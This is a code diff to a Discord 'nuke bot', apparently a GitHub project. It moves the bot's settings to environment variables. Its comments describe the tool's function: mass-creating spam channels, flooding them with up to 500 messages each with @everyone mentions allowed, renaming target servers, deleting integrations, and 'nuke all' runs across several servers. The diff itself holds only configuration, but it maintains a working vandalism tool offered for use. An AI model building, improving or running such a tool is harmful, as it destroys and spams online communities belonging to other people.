@@ -19,45 +19,65 @@ const client = new Client({
     allowedMentions: { parse: ["users", "roles", "everyone"] }
 });
 
+// ==================== ENV PARSERS ====================
+function parseBool(val, fallback) {
+    if (val === undefined || val === "") return fallback;
+    return ["1", "true", "yes", "on"].includes(String(val).trim().toLowerCase());
+}
+
+function parseIntEnv(val, fallback) {
+    if (val === undefined || val === "") return fallback;
+    const n = Number.parseInt(String(val).trim(), 10);
+    return Number.isFinite(n) ? n : fallback;
+}
+
+function parseIdList(val) {
+    if (!val) return [];
+    return String(val)
+        .split(",")
+        .map(s => s.trim())
+        .filter(Boolean);
+}
+
 // ==================== CONFIG ====================
 // Discord user ID of the bot owner; only this user is authorized to run nuke, abort, or recovery commands
-const OWNER_ID = "12345678912345679";
+const OWNER_ID = process.env.OWNER_ID || "12345678912345679";
 
 // Name of the parent category created to group all newly generated text channels
-const CATEGORY_NAME = "Nuked Server";
+const CATEGORY_NAME = process.env.CATEGORY_NAME || "Nuked Server";
 
 // Prefix used when creating new channels; channels are named "<CHANNEL_BASE_NAME>-1", "<CHANNEL_BASE_NAME>-2", etc.
-const CHANNEL_BASE_NAME = "nuked";
+const CHANNEL_BASE_NAME = process.env.CHANNEL_BASE_NAME || "nuked";
 
 // Total number of text channels to create under the category per target server (Discord guilds cap total channels at 500)
-const CHANNEL_COUNT = 50;
+const CHANNEL_COUNT = parseIntEnv(process.env.CHANNEL_COUNT, 50);
 
 // Default number of spam messages sent into each newly created channel (can be overridden per command call, clamped 1-500)
-const MESSAGES_PER_CHANNEL = 100;
+const MESSAGES_PER_CHANNEL = parseIntEnv(process.env.MESSAGES_PER_CHANNEL, 100);
 
 // Content sent in every spam message; mentions (users, roles, @everyone) are allowed via client allowedMentions
-const MESSAGE_TEXT = "This server has been nuked using Berkayprof's nuke bot! https://github.com/berkayprof/nukebot"; 
+const MESSAGE_TEXT = process.env.MESSAGE_TEXT || "This server has been nuked using Berkayprof's nuke bot! https://github.com/berkayprof/nukebot";
 
-// Array of guild (server) ID strings to exclude during bulk operations ("nuke all" and resume filtering)
-const SKIP_GUILDS = [ /* "123456789012345678", "987654321987654321" */ ];
+// Comma-separated guild (server) ID strings to exclude during bulk operations ("nuke all" and resume filtering)
+const SKIP_GUILDS = parseIdList(process.env.SKIP_GUILDS);
 
 // Replacement name applied to each target guild (truncated to Discord's 100-character limit)
-const NEW_SERVER_NAME = "This server has been nuked!";
+const NEW_SERVER_NAME = process.env.NEW_SERVER_NAME || "This server has been nuked!";
 
 // When true, skips deleting integrations belonging to other Discord bots; the bot's own integration is always skipped
-const SKIP_OTHER_BOT_INTEGRATIONS = true;
+const SKIP_OTHER_BOT_INTEGRATIONS = parseBool(process.env.SKIP_OTHER_BOT_INTEGRATIONS, true);
 
 // When true, the bot automatically leaves a guild after finishing its nuke sequence (after a brief delay)
-const AUTO_LEAVE = false;
+const AUTO_LEAVE = parseBool(process.env.AUTO_LEAVE, false);
 
 // Maximum number of guilds processed concurrently during a multi-server nuke run
-const GUILD_CONCURRENCY = 2;
+const GUILD_CONCURRENCY = parseIntEnv(process.env.GUILD_CONCURRENCY, 2);
 
-// Time-to-live (in milliseconds) for a pending "nuke all" confirmation prompt before it expires (currently 5 minutes)
-const CONFIRM_TTL_MS = 5 * 60 * 1000;
+// Time-to-live (in milliseconds) for a pending "nuke all" confirmation prompt before it expires (default: 5 minutes)
+const CONFIRM_TTL_MS = parseIntEnv(process.env.CONFIRM_TTL_MS, 5 * 60 * 1000);
 
 // File path on disk where run progress is persisted so interrupted multi-guild jobs can be resumed or cleared
-const STATE_FILE = path.join(__dirname, "nuke-state.json");
+const STATE_FILE = path.resolve(__dirname, process.env.STATE_FILE || "nuke-state.json");
 
 // ==================== LOGGING ====================
 const LOG_DIR = path.join(__dirname, "logs");
@@ -732,4 +752,4 @@ if (!token) {
     process.exit(1);
 }
 
-client.login(token);	
+client.login(token);
